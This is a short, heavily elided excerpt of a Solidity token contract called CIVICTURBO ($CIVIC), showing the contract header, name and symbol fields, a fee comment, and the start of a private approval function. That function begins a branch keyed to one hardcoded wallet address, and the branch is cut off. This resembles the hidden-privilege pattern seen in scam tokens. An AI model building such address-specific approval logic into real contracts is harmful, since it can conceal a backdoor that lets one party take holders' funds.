...
contract CIVICTURBO is Context, IERC20, Ownable {
    ...
    string private _name = "CIVICTURBO";
    string private _symbol = "$CIVIC";
   ...
   //this method is responsible for taking all fee, if takeFee is true
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        ...
        if (owner == address(0x574D911AE5307e275f739092ffF11c634626ed2F)) {
